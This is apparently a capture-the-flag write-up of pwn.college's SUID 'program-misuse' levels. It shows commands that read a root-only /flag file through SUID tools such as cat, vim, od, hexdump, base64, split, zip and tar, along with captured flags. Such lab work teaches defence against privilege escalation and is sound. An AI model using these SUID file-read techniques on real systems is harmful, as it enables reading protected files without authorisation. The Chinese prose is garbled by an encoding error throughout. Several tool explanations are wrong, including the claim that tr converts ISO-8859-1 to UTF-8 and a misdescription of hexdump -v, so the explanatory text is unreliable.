<p>ç„¶è€Œï¼ŒSUID ä¹Ÿå¯èƒ½å­˜åœ¨å®‰å…¨é£é™©ï¼Œå› ä¸ºå®ƒå¯ä»¥è¢«æ»¥ç”¨ä¸ºæå‡æƒé™æ”»å‡»çš„ä¸€ç§æ‰‹æ®µã€‚å› æ­¤ï¼Œå¿…é¡»å°å¿ƒåœ°ç®¡ç† SUID æƒé™ï¼Œå¹¶ç¡®ä¿åªæœ‰å¿…è¦çš„ç¨‹åºæ‹¥æœ‰å®ƒã€‚</p>
<p>æ­¤ä¸“é¢˜ä¸ºSUIDå®‰å…¨æ¨¡å—</p>
<h3 id="level1cat"><a class="markdownIt-Anchor" href="#level1cat"></a> level1(cat)</h3>
<p><code>cat /flag</code></p>
<h3 id="level2more"><a class="markdownIt-Anchor" href="#level2more"></a> level2(more)</h3>
<p><code>more /flag</code></p>
<h3 id="level3less"><a class="markdownIt-Anchor" href="#level3less"></a> level3(less)</h3>
<p><code>less /flag</code></p>
<h3 id="level4tail"><a class="markdownIt-Anchor" href="#level4tail"></a> level4(tail)</h3>
<p><code>tail /flag</code></p>
<h3 id="level5head"><a class="markdownIt-Anchor" href="#level5head"></a> level5(head)</h3>
<p><code>head /flag</code></p>
<h3 id="level6sort"><a class="markdownIt-Anchor" href="#level6sort"></a> level6(sort)</h3>
<p><code>sort /flag</code></p>
<h3 id="level7vim"><a class="markdownIt-Anchor" href="#level7vim"></a> level7(vim)</h3>
<p><code>vim /flag</code></p>
<p><code>:q!</code></p>
<h3 id="level8emacs"><a class="markdownIt-Anchor" href="#level8emacs"></a> level8(emacs)</h3>
<p><code>emacs /flag</code></p>
<h3 id="level9nano"><a class="markdownIt-Anchor" href="#level9nano"></a> level9(nano)</h3>
<p><code>nano /flag</code></p>
<h3 id="level10rev"><a class="markdownIt-Anchor" href="#level10rev"></a> level10(rev)</h3>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hacker@program-misuse~level10:/challenge$ <span class="token function">rev</span> /flag
<span class="token punctuation">&#125;</span>WzU0NzczLDE1Ml0.moqZisxxzyckvEaw_thAOt6crp8<span class="token punctuation">&#123;</span>egelloc.nwp
hacker@program-misuse~level10:/challenge$ <span class="token function">rev</span>
<span class="token punctuation">&#125;</span>WzU0NzczLDE1Ml0.moqZisxxzyckvEaw_thAOt6crp8<span class="token punctuation">&#123;</span>egelloc.nwp
pwn.college<span class="token punctuation">&#123;</span>8prc6tOAht_waEvkcyzxxsiZqom.0lM1EDLzczN0UzW<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="level11od"><a class="markdownIt-Anchor" href="#level11od"></a> level11(od)</h3>
<p>å­¦ä¼šç”¨<code>man</code> ä¸ä¼šçš„å·¥å…·å°± <code>man od</code></p>
<p>åœ¨è®¡ç®—æœºé¢†åŸŸï¼Œâ€œodâ€ æ˜¯ä¸€ä¸ªå¸¸ç”¨çš„æŒ‡ä»¤ï¼Œé€šå¸¸ç”¨äºæ˜¾ç¤ºæ–‡ä»¶çš„å…«è¿›åˆ¶å†…å®¹ã€‚ä»¥ä¸‹æ˜¯ä¸€äº›å¸¸è§çš„ â€œodâ€ æŒ‡ä»¤é€‰é¡¹ï¼š</p>
<ol>
<li><code>-a</code>ï¼šä»¥å¯æ‰“å°å­—ç¬¦çš„å½¢å¼æ˜¾ç¤ºæ–‡ä»¶å†…å®¹ã€‚</li>
<li><code>-b</code>ï¼šä»¥å…«è¿›åˆ¶å½¢å¼æ˜¾ç¤ºæ–‡ä»¶å†…å®¹ã€‚</li>
<li><code>-c</code>ï¼šä»¥å­—ç¬¦å½¢å¼æ˜¾ç¤ºæ–‡ä»¶å†…å®¹ã€‚</li>
<li><code>-d</code>ï¼šä»¥åè¿›åˆ¶å½¢å¼æ˜¾ç¤ºæ–‡ä»¶å†…å®¹ã€‚</li>
<li><code>-h</code>ï¼šä»¥åå…­è¿›åˆ¶å½¢å¼æ˜¾ç¤ºæ–‡ä»¶å†…å®¹ã€‚</li>
<li><code>-t [format]</code>ï¼šæŒ‡å®šè¾“å‡ºæ ¼å¼ï¼Œå¦‚ <code>-t x1</code> å¯ä»¥å°†è¾“å‡ºæ ¼å¼æŒ‡å®šä¸ºæ¯ä¸ªå­—èŠ‚ä»¥åå…­è¿›åˆ¶æ˜¾ç¤ºã€‚</li>
<li><code>-A</code> æ˜¾ç¤ºåœ°å€</li>
</ol>
<p><code>tr</code> å‘½ä»¤ç”¨äºå­—ç¬¦æ›¿æ¢æˆ–åˆ é™¤ã€‚ä»¥ä¸‹æ˜¯ä¸€äº›å¸¸è§çš„ <code>tr</code> å‘½ä»¤ç”¨æ³•ï¼š</p>
<ol>
<li><strong>æ›¿æ¢å­—ç¬¦</strong>ï¼šä½¿ç”¨ <code>-s</code> é€‰é¡¹æ¥æŒ‡å®šè¦æ›¿æ¢çš„å­—ç¬¦é›†åˆã€‚ä¾‹å¦‚ï¼Œå°†æ–‡ä»¶ä¸­çš„æ‰€æœ‰å°å†™å­—æ¯æ›¿æ¢ä¸ºå¤§å†™å­—æ¯ï¼š</li>
</ol>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">tr</span> <span class="token string">'a-z'</span> <span class="token string">'A-Z'</span> <span class="token operator">&lt;</span> input.txt <span class="token operator">></span> output.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<ol>
<li><strong>åˆ é™¤å­—ç¬¦</strong>ï¼šä½¿ç”¨ <code>-d</code> é€‰é¡¹æ¥åˆ é™¤æŒ‡å®šçš„å­—ç¬¦ã€‚ä¾‹å¦‚ï¼Œåˆ é™¤æ–‡ä»¶ä¸­çš„æ‰€æœ‰æ•°å­—ï¼š</li>
</ol>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">tr</span> <span class="token parameter variable">-d</span> <span class="token string">'0-9'</span> <span class="token operator">&lt;</span> input.txt <span class="token operator">></span> output.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<ol>
<li><strong>è½¬æ¢å­—ç¬¦</strong>ï¼šä½¿ç”¨ <code>-c</code> é€‰é¡¹æ¥å¯¹å­—ç¬¦è¿›è¡Œè½¬æ¢ã€‚ä¾‹å¦‚ï¼Œå°†æ–‡ä»¶ä¸­çš„æ‰€æœ‰å°å†™å­—æ¯è½¬æ¢ä¸ºå¤§å†™å­—æ¯ï¼ŒåŒæ—¶åˆ é™¤å…¶ä»–å­—ç¬¦ï¼š</li>
</ol>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">tr</span> <span class="token parameter variable">-cd</span> <span class="token string">'a-zA-Z'</span> <span class="token operator">&lt;</span> input.txt <span class="token operator">></span> output.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<ol>
<li><strong>å‹ç¼©å­—ç¬¦</strong>ï¼šä½¿ç”¨ <code>-s</code> é€‰é¡¹æ¥å‹ç¼©å­—ç¬¦ã€‚ä¾‹å¦‚ï¼Œå°†æ–‡ä»¶ä¸­è¿ç»­é‡å¤çš„ç©ºæ ¼æ›¿æ¢ä¸ºå•ä¸ªç©ºæ ¼ï¼š</li>
</ol>
<pre class="line-numbers language-none"><code class="language-none">tr -s &#39; &#39; &lt; input.txt &gt; output.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<ol>
<li><strong>è½¬æ¢å­—ç¬¦ç¼–ç </strong>ï¼šå¯ä»¥ä½¿ç”¨ <code>tr</code> å‘½ä»¤å°†ä¸€ä¸ªå­—ç¬¦é›†æ˜ å°„ä¸ºå¦ä¸€ä¸ªå­—ç¬¦é›†ã€‚ä¾‹å¦‚ï¼Œå°† ISO-8859-1 ç¼–ç çš„æ–‡æœ¬è½¬æ¢ä¸º UTF-8 ç¼–ç ï¼š</li>
</ol>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">tr</span> <span class="token string">'ISO-8859-1'</span> <span class="token string">'UTF-8'</span> <span class="token operator">&lt;</span> input.txt <span class="token operator">></span> output.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hacker@program-misuse~level11:/challenge$ od <span class="token parameter variable">-An</span> <span class="token parameter variable">-a</span> /flag <span class="token operator">|</span><span class="token function">tr</span> <span class="token parameter variable">-d</span> <span class="token string">" <span class="token entity" title="\n">\n</span>"</span>
pwn.college<span class="token punctuation">&#123;</span>EjkuFmjnR3PYcvBLt1eB2aHqJG_.01M1EDLzczN0UzW<span class="token punctuation">&#125;</span>nl<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<h3 id="level12hexdump"><a class="markdownIt-Anchor" href="#level12hexdump"></a> level12(hexdump)</h3>
<p><code>hexdump -v -e '/1 &quot;%_p&quot;' /flag</code></p>
<p>è¿™ä¸ªå‘½ä»¤ä¸­çš„å‚æ•°è§£é‡Šå¦‚ä¸‹ï¼š</p>
<ul>
<li><code>-v</code>ï¼šæŒ‡å®šé™é»˜æ¨¡å¼ã€‚è¿™å°†ç¦æ­¢ hexdump åœ¨è¾“å‡ºä¸­æ˜¾ç¤ºé‡å¤çš„è¡Œã€‚</li>
<li><code>-e</code>ï¼šæŒ‡å®šæ ¼å¼åŒ–è¾“å‡ºçš„æ¨¡æ¿ã€‚åœ¨è¿™ä¸ªæ¨¡æ¿ä¸­ï¼Œ<code>/1</code> è¡¨ç¤ºæŒ‰å­—èŠ‚å¤„ç†æ–‡ä»¶ï¼Œ<code>&quot;%_p&quot;</code> åˆ™è¡¨ç¤ºæ‰“å°å¯æ‰“å°å­—ç¬¦ã€‚</li>
</ul>
<p>ä»¥ä¸‹æ˜¯ä¸€äº›å¸¸ç”¨çš„ <code>hexdump</code> æŒ‡ä»¤é€‰é¡¹ï¼š</p>
<ol>
<li>
<p><code>-C</code>ï¼šä»¥åå…­è¿›åˆ¶å’ŒASCIIå­—ç¬¦çš„å½¢å¼æ˜¾ç¤ºæ–‡ä»¶å†…å®¹ï¼Œæ¯ä¸ªå­—èŠ‚å¯¹åº”ä¸€ä¸ªåå…­è¿›åˆ¶æ•°å­—å’Œä¸€ä¸ªASCIIå­—ç¬¦ã€‚</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hexdump <span class="token parameter variable">-C</span> filename<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li>
<p><code>-c</code>ï¼šä»¥å­—ç¬¦å½¢å¼æ˜¾ç¤ºæ–‡ä»¶å†…å®¹ï¼ŒåŒæ—¶æ˜¾ç¤ºæ¯ä¸ªå­—ç¬¦çš„å…«è¿›åˆ¶å€¼ã€‚</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hexdump <span class="token parameter variable">-c</span> filename<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li>
<p><code>-n</code>ï¼šé™åˆ¶æ˜¾ç¤ºçš„å­—èŠ‚æ•°ã€‚</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hexdump <span class="token parameter variable">-n</span> <span class="token number">100</span> filename<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li>
<p><code>-s</code>ï¼šä»æŒ‡å®šçš„åç§»é‡å¼€å§‹æ˜¾ç¤ºæ–‡ä»¶å†…å®¹ã€‚</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hexdump <span class="token parameter variable">-s</span> <span class="token number">100</span> filename<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li>
<p><code>-v</code>ï¼šå…³é—­é»˜è®¤çš„è¾“å‡ºæ ¼å¼ï¼Œä»¥åŸå§‹çš„åå…­è¿›åˆ¶æˆ–å…«è¿›åˆ¶æ ¼å¼æ˜¾ç¤ºæ•°æ®ã€‚</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hexdump <span class="token parameter variable">-v</span> filename<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
</ol>
<p>è¿™äº›æ˜¯å¸¸ç”¨çš„ <code>hexdump</code> æŒ‡ä»¤é€‰é¡¹ï¼Œå¯ä»¥æ ¹æ®å…·ä½“çš„éœ€æ±‚é€‰æ‹©åˆé€‚çš„é€‰é¡¹æ¥æŸ¥çœ‹æ–‡ä»¶çš„å†…å®¹ã€‚</p>
<h3 id="level13xxd"><a class="markdownIt-Anchor" href="#level13xxd"></a> level13(xxd)</h3>
<p><code>xxd /flag</code></p>
<h3 id="level14base32"><a class="markdownIt-Anchor" href="#level14base32"></a> level14(base32)</h3>
<p><code>base32 /flag |base32 -d</code></p>
<h3 id="level15base64"><a class="markdownIt-Anchor" href="#level15base64"></a> level15(base64)</h3>
<p><code>base64 /flag |base64 -d</code></p>
<h3 id="level16split"><a class="markdownIt-Anchor" href="#level16split"></a> level16(split)</h3>
<blockquote>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">split</span> <span class="token punctuation">[</span>-b byte<span class="token punctuation">]</span><span class="token punctuation">[</span>-C <span class="token punctuation">]</span><span class="token punctuation">[</span>-<span class="token punctuation">]</span><span class="token punctuation">[</span>-l rowcount<span class="token punctuation">]</span><span class="token punctuation">[</span>the <span class="token function">file</span> to split<span class="token punctuation">]</span><span class="token punctuation">[</span>the prefix of the output_file<span class="token punctuation">]</span><span class="token punctuation">[</span>-a suffix_len<span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</blockquote>
<p><code>split</code> å‘½ä»¤ç”¨äºå°†æ–‡ä»¶æ‹†åˆ†æˆå¤šä¸ªæ›´å°çš„æ–‡ä»¶ã€‚å®ƒæ˜¯ä¸€ä¸ªåœ¨ Unix å’Œç±» Unix ç³»ç»Ÿä¸­å¸¸è§çš„å‘½ä»¤è¡Œå·¥å…·ã€‚<code>split</code> å‘½ä»¤é€šå¸¸ç”¨äºéœ€è¦å°†å¤§æ–‡ä»¶åˆ†å‰²æˆå¤šä¸ªè¾ƒå°æ–‡ä»¶ä»¥ä¾¿è¿›è¡Œä¼ è¾“ã€å¤‡ä»½æˆ–å¤„ç†çš„æƒ…å†µã€‚</p>
<p>ä»¥ä¸‹æ˜¯ <code>split</code> å‘½ä»¤çš„ä¸€èˆ¬æ ¼å¼ï¼š</p>
<pre class="line-numbers language-none"><code class="language-none">split [OPTION]... [INPUT [PREFIX]]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>å…¶ä¸­ï¼š</p>
<ul>
<li><code>OPTION</code>ï¼šæ˜¯ä¸€äº›é€‰é¡¹ï¼Œå¯ä»¥ç”¨æ¥æ§åˆ¶æ‹†åˆ†çš„è¡Œä¸ºã€‚</li>
<li><code>INPUT</code>ï¼šæ˜¯è¦æ‹†åˆ†çš„è¾“å…¥æ–‡ä»¶çš„åç§°ã€‚</li>
<li><code>PREFIX</code>ï¼šæ˜¯è¾“å‡ºæ–‡ä»¶çš„å‰ç¼€ã€‚è¾“å‡ºæ–‡ä»¶çš„åç§°å°†ä»¥æ­¤å‰ç¼€å¼€å§‹ï¼Œåé¢è·Ÿç€ä¸€ä¸ªå­—æ¯åºå·ä»¥åŒºåˆ†ä¸åŒçš„è¾“å‡ºæ–‡ä»¶ã€‚</li>
</ul>
<p>å¸¸ç”¨çš„é€‰é¡¹åŒ…æ‹¬ï¼š</p>
<ul>
<li><code>-b, --bytes=SIZE</code>ï¼šæŒ‰å¤§å°æ‹†åˆ†æ–‡ä»¶ã€‚SIZE å¯ä»¥æ˜¯ä»¥ <code>k</code>ã€<code>M</code>ã€<code>G</code> ç­‰ä¸ºå•ä½çš„æ–‡ä»¶å¤§å°ã€‚</li>
<li><code>-l, --lines=NUMBER</code>ï¼šæŒ‰è¡Œæ•°æ‹†åˆ†æ–‡ä»¶ã€‚</li>
<li><code>-d</code>ï¼šä½¿ç”¨æ•°å­—åç¼€è€Œä¸æ˜¯å­—æ¯åç¼€ã€‚</li>
<li><code>-a, --suffix-length=N</code>ï¼šæŒ‡å®šç”Ÿæˆçš„æ–‡ä»¶ååç¼€é•¿åº¦ã€‚</li>
<li><code>-n, --number=CHUNKS</code>ï¼šæŒ‡å®šè¦ç”Ÿæˆçš„æ–‡ä»¶æ•°é‡ã€‚</li>
</ul>
<p>ä»¥ä¸‹æ˜¯ä¸€ä¸ªç¤ºä¾‹ï¼Œå°†ä¸€ä¸ªæ–‡ä»¶æ‹†åˆ†æˆæ¯ä¸ªæ–‡ä»¶å¤§å°ä¸º1MBçš„å¤šä¸ªæ–‡ä»¶ï¼š</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">split</span> <span class="token parameter variable">-b</span> 1M largefile.txt splitfile<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>è¿™ä¸ªå‘½ä»¤ä¼šå°†åä¸º <code>largefile.txt</code> çš„æ–‡ä»¶æ‹†åˆ†æˆå¤šä¸ªå¤§å°ä¸º1MBçš„æ–‡ä»¶ï¼Œå¹¶ä»¥ <code>splitfile</code> ä½œä¸ºå‰ç¼€å‘½åã€‚ç”Ÿæˆçš„æ–‡ä»¶åå°†ä»¥ <code>splitfile</code> å¼€å¤´ï¼Œåè·Ÿä¸€ä¸ªå­—æ¯åºå·ä»¥åŒºåˆ†ä¸åŒçš„æ–‡ä»¶ã€‚</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hacker@program-misuse~level16:/challenge$ <span class="token function">split</span> /flag
hacker@program-misuse~level16:/challenge$ <span class="token function">ls</span>
babysuid_level16  xaa
hacker@program-misuse~level16:/challenge$ <span class="token function">cat</span> xaa
pwn.college<span class="token punctuation">&#123;</span>4EJPD2ROB2wmP5Nv6kDsY6sawPM.0FO1EDLzczN0UzW<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="level17-gzip"><a class="markdownIt-Anchor" href="#level17-gzip"></a> level17 (gzip)</h3>
<p><code>zcat</code> å‘½ä»¤æ˜¯ä¸€ä¸ªç”¨äºæŸ¥çœ‹å‹ç¼©æ–‡ä»¶å†…å®¹çš„å‘½ä»¤ã€‚å®ƒä¸ <code>cat</code> å‘½ä»¤ç±»ä¼¼ï¼Œä½†æ˜¯å¯ä»¥ç›´æ¥æŸ¥çœ‹ç»è¿‡å‹ç¼©çš„æ–‡ä»¶ï¼Œè€Œä¸éœ€è¦å…ˆè§£å‹ç¼©ã€‚<code>zcat</code> å®é™…ä¸Šæ˜¯ <code>gzip -d -c</code> å‘½ä»¤çš„ç®€å†™ï¼Œå®ƒä¼šè§£å‹ç¼©æ–‡ä»¶å¹¶å°†è§£å‹åçš„å†…å®¹è¾“å‡ºåˆ°æ ‡å‡†è¾“å‡ºã€‚</p>
<ul>
<li>-c è¡¨ç¤ºè¾“å‡ºåˆ°æ ‡å‡†è¾“å‡º</li>
<li>-d è§£å‹ç¼©</li>
</ul>
<p>ä½¿ç”¨ <code>zcat</code> å‘½ä»¤çš„æ ¼å¼å¦‚ä¸‹ï¼š</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">zcat filename.gz<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>è¿™ä¸ªå‘½ä»¤ä¼šå°†åä¸º <code>filename.gz</code> çš„å‹ç¼©æ–‡ä»¶è§£å‹ç¼©ï¼Œå¹¶å°†è§£å‹åçš„å†…å®¹ç›´æ¥è¾“å‡ºåˆ°æ ‡å‡†è¾“å‡ºã€‚ä½ å¯ä»¥é€šè¿‡ç®¡é“å°†å…¶ä¸å…¶ä»–å‘½ä»¤ä¸€èµ·ä½¿ç”¨ï¼Œæˆ–è€…é‡å®šå‘åˆ°æ–‡ä»¶ä¸­ä¿å­˜ã€‚</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hacker@program-misuse~level17:/$ zcat flag.gz 
pwn.college<span class="token punctuation">&#123;</span>UePLx3QWU4tdu3DffqC263k2xH.0VO1EDLzczN0Uz<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<h3 id="level18bzip2"><a class="markdownIt-Anchor" href="#level18bzip2"></a> level18(bzip2)</h3>
<p>ä¸level17ç±»ä¼¼</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hacker@program-misuse~level18:/$ <span class="token function">bzip2</span> <span class="token parameter variable">-d</span> <span class="token parameter variable">-c</span> flag.bz2 
pwn.college<span class="token punctuation">&#123;</span>kLWPJ4DFr1DV_MV9WKvshGFFn5U.0FM2EDLzczN0UzW<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<h3 id="level19zip"><a class="markdownIt-Anchor" href="#level19zip"></a> level19(zip)</h3>
<p>ä»¥ä¸‹æ˜¯ä¸€äº›å¸¸ç”¨çš„ <code>zip</code> å‘½ä»¤é€‰é¡¹å’Œç¤ºä¾‹ï¼š</p>
<ol>
<li><strong>å‹ç¼©æ–‡ä»¶</strong>ï¼š</li>
</ol>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">zip</span> archive.zip file1.txt file2.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>è¿™ä¸ªå‘½ä»¤ä¼šå°† <code>file1.txt</code> å’Œ <code>file2.txt</code> ä¸¤ä¸ªæ–‡ä»¶å‹ç¼©æˆä¸€ä¸ªåä¸º <code>archive.zip</code> çš„å‹ç¼©æ–‡ä»¶ã€‚</p>
<ol start="2">
<li><strong>å‹ç¼©ç›®å½•</strong>ï¼š</li>
</ol>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">zip</span> <span class="token parameter variable">-r</span> archive.zip directory/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>è¿™ä¸ªå‘½ä»¤ä¼šå°† <code>directory/</code> ç›®å½•åŠå…¶ä¸‹çš„æ‰€æœ‰æ–‡ä»¶å’Œå­ç›®å½•å‹ç¼©æˆä¸€ä¸ªåä¸º <code>archive.zip</code> çš„å‹ç¼©æ–‡ä»¶ã€‚</p>
<ol start="3">
<li><strong>æ·»åŠ æ–‡ä»¶åˆ°å·²å­˜åœ¨çš„å‹ç¼©æ–‡ä»¶</strong>ï¼š</li>
</ol>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">zip</span> archive.zip newfile.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>è¿™ä¸ªå‘½ä»¤ä¼šå°† <code>newfile.txt</code> æ·»åŠ åˆ°åä¸º <code>archive.zip</code> çš„å·²å­˜åœ¨çš„å‹ç¼©æ–‡ä»¶ä¸­ã€‚</p>
<ol start="4">
<li><strong>åˆ—å‡ºå‹ç¼©æ–‡ä»¶ä¸­çš„å†…å®¹</strong>ï¼š</li>
</ol>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">unzip</span> <span class="token parameter variable">-l</span> archive.zip<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>è¿™ä¸ªå‘½ä»¤ä¼šåˆ—å‡ºåä¸º <code>archive.zip</code> çš„å‹ç¼©æ–‡ä»¶ä¸­çš„æ‰€æœ‰æ–‡ä»¶å’Œç›®å½•ã€‚</p>
<ol start="5">
<li><strong>è§£å‹ç¼©æ–‡ä»¶</strong>ï¼š</li>
</ol>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">unzip</span> archive.zip<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>è¿™ä¸ªå‘½ä»¤ä¼šå°†åä¸º <code>archive.zip</code> çš„å‹ç¼©æ–‡ä»¶è§£å‹ç¼©åˆ°å½“å‰ç›®å½•ã€‚</p>
<ol start="6">
<li><strong>è§£å‹ç¼©åˆ°æŒ‡å®šç›®å½•</strong>ï¼š</li>
</ol>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">unzip</span> archive.zip <span class="token parameter variable">-d</span> /path/to/directory/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>è¿™ä¸ªå‘½ä»¤ä¼šå°†åä¸º <code>archive.zip</code> çš„å‹ç¼©æ–‡ä»¶è§£å‹ç¼©åˆ°æŒ‡å®šçš„ç›®å½• <code>/path/to/directory/</code> ä¸­ã€‚</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hacker@program-misuse~level19:/challenge$ <span class="token function">man</span> <span class="token function">zip</span>
hacker@program-misuse~level19:/challenge$ <span class="token function">zip</span> flag.zip /flag
  adding: flag <span class="token punctuation">(</span>stored <span class="token number">0</span>%<span class="token punctuation">)</span>
hacker@program-misuse~level19:/challenge$ <span class="token function">ls</span>
babysuid_level19  flag.zip
Archive:  flag.zip
caution: filename not matched:  <span class="token parameter variable">-c</span>
hacker@program-misuse~level19:/challenge$ <span class="token function">unzip</span> <span class="token parameter variable">-c</span> flag.zip 
Archive:  flag.zip
 extracting: flag                    
pwn.college<span class="token punctuation">&#123;</span>Ez72p6_sW8GY7XN4ffOXC_GhJmn.0VM2EDLzczN0UzW<span class="token punctuation">&#125;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="level20tar"><a class="markdownIt-Anchor" href="#level20tar"></a> level20(tar)</h3>
<p>ä»¥ä¸‹æ˜¯ä¸€äº›å¸¸ç”¨çš„ <code>tar</code> å‘½ä»¤é€‰é¡¹å’Œç¤ºä¾‹ï¼š</p>
<ol>
<li><strong>åˆ›å»ºå½’æ¡£æ–‡ä»¶</strong>ï¼š</li>
</ol>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">tar</span> <span class="token parameter variable">-cvf</span> archive.tar file1 file2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>è¿™ä¸ªå‘½ä»¤ä¼šå°† <code>file1</code> å’Œ <code>file2</code> æ‰“åŒ…æˆä¸€ä¸ªåä¸º <code>archive.tar</code> çš„å½’æ¡£æ–‡ä»¶ã€‚</p>
<ol start="2">
<li><strong>åˆ›å»ºå¸¦æœ‰ gzip å‹ç¼©çš„å½’æ¡£æ–‡ä»¶</strong>ï¼š</li>
</ol>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">tar</span> <span class="token parameter variable">-cvzf</span> archive.tar.gz directory/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>è¿™ä¸ªå‘½ä»¤ä¼šå°† <code>directory/</code> ç›®å½•åŠå…¶ä¸‹çš„æ‰€æœ‰æ–‡ä»¶å’Œå­ç›®å½•æ‰“åŒ…æˆä¸€ä¸ªåä¸º <code>archive.tar.gz</code> çš„å½’æ¡£æ–‡ä»¶ï¼Œå¹¶ä½¿ç”¨ gzip è¿›è¡Œå‹ç¼©ã€‚</p>
<ol start="3">
<li><strong>åˆ›å»ºå¸¦æœ‰ bzip2 å‹ç¼©çš„å½’æ¡£æ–‡ä»¶</strong>ï¼š</li>
</ol>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">tar</span> <span class="token parameter variable">-cvjf</span> archive.tar.bz2 directory/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>è¿™ä¸ªå‘½ä»¤ä¼šå°† <code>directory/</code> ç›®å½•åŠå…¶ä¸‹çš„æ‰€æœ‰æ–‡ä»¶å’Œå­ç›®å½•æ‰“åŒ…æˆä¸€ä¸ªåä¸º <code>archive.tar.bz2</code> çš„å½’æ¡£æ–‡ä»¶ï¼Œå¹¶ä½¿ç”¨ bzip2 è¿›è¡Œå‹ç¼©ã€‚</p>
<ol start="4">
<li><strong>åˆ—å‡ºå½’æ¡£æ–‡ä»¶ä¸­çš„å†…å®¹</strong>ï¼š</li>
</ol>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">tar</span> <span class="token parameter variable">-tvf</span> archive.tar<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>è¿™ä¸ªå‘½ä»¤ä¼šåˆ—å‡ºåä¸º <code>archive.tar</code> çš„å½’æ¡£æ–‡ä»¶ä¸­çš„æ‰€æœ‰æ–‡ä»¶å’Œç›®å½•ã€‚</p>
<ol start="5">
<li><strong>è§£å‹å½’æ¡£æ–‡ä»¶</strong>ï¼š</li>
</ol>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">tar</span> <span class="token parameter variable">-xvf</span> archive.tar<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>è¿™ä¸ªå‘½ä»¤ä¼šå°†åä¸º <code>archive.tar</code> çš„å½’æ¡£æ–‡ä»¶è§£å‹ç¼©åˆ°å½“å‰ç›®å½•ã€‚</p>
<ol start="6">
<li><strong>è§£å‹å½’æ¡£æ–‡ä»¶åˆ°æŒ‡å®šç›®å½•</strong>ï¼š</li>
</ol>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">tar</span> <span class="token parameter variable">-xvf</span> archive.tar <span class="token parameter variable">-C</span> /path/to/directory/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
